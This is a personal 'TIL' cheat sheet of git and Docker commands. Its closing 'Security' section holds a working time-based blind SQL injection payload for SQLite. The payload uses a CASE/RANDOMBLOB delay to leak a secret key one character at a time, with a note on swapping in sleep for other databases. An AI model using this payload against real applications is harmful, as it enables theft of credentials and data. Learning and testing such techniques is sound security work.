# TIL

## GIT

`git checkout -b NEWBRANCH`

`git push --set-upstream origin BRANCHNAME`

`git reset origin --hard`

`git pull origin your_branch` # fetch and merge in one operation

`git stash`

`git stash pop`

Oppsite of `git a .` -> `git reset .`

`git reset HEAD^` -> undo commit and get the files back

### Ammend
`git commit --amend `

`:wq`

`git push -f ...  `

### Change remote link 
`git remote -v`

`git remote set-url origin NEW_URL`

`git pull # to verify`

## Docker
### Starting a docker-compose.yml file
`docker-compose pull`

`docker-compose up -d`

### Building a docker image
`docker build . -t NAME`

`docker run -p 8070:8080 NAME(Might also be a  url)`

Then you can see it on  http://localhost:8070/Index.html

## Security
`SELECT * from users where username='admin' and (CASE WHEN (substr(key, 1, 1) = 'a') then LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000)))) else 1 end); --`
this basically checks if there is the specified letter in the key at a given position. if there is, we do some operation (use sleep if not sqlite3)
